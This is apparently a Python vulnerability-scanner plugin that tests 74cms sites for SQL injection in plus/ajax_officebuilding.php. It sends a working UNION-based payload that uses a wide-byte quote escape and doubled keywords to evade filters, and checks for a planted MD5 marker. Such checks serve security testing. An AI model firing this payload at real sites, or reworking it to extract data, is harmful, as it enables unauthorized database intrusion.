import re


def assign(service,arg):
    if service == "74cms":
        return True,arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ =curl.curl(url + "plus/ajax_officebuilding.php?act=key&key=asd%E9%94%A6%27%20uniounionn%20selselectect"
                   "%201,2,3,md5(7836457),5,6,7,8,9%23")
    if code == 200:
        if "3438d5e3ead84b2effc5ec33ed1239f5" in res:
            security_info('find sql injection: ' + arg+ 'plus/ajax_officebuilding.php')
if __name__ == '__main__':
    from dummy import *
    audit(assign('74cms', 'http://www.example.com/')[1])